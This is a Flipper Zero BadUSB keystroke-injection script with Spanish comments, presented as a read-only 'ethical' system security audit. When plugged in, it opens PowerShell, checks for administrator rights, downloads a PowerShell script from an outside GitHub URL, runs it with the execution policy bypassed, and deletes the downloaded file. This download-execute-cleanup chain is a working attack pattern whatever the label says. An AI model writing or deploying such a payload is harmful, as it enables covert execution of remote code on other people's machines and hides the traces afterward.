REM =========================================
REM 001
REM 001-System_Security_Audit - Flipper Zero
REM Download -> Execute -> Cleanup
REM Read-only | Ethical | CyberRedPanda
REM =========================================

ID US
DELAY 1000

REM --- Abrir PowerShell ---
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1500

REM --- Verificar si está en modo administrador ---
STRING if (-not ([Security.Principal.WindowsPrincipal] `
([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole(`
[Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Host '⚠️ PowerShell NO está en modo Administrador. Ejecute manualmente como Admin y vuelva a intentar.'; pause; exit }
ENTER
DELAY 2000

REM --- Descargar script desde GitHub ---
STRING curl.exe -L https://raw.githubusercontent.com/hacker-Cabronico/Flipper_Zero/main/001-System_Security_Audit/001-System_Security_Audit.ps1 -o "%USERPROFILE%\\CyberRedPanda001.ps1"
ENTER
DELAY 3000

REM --- Ejecutar script ---
STRING powershell -NoProfile -ExecutionPolicy Bypass -File "%USERPROFILE%\\CyberRedPanda001.ps1"
ENTER
DELAY 5000

REM --- Limpiar ---
STRING del "%USERPROFILE%\\CyberRedPanda001.ps1"
ENTER
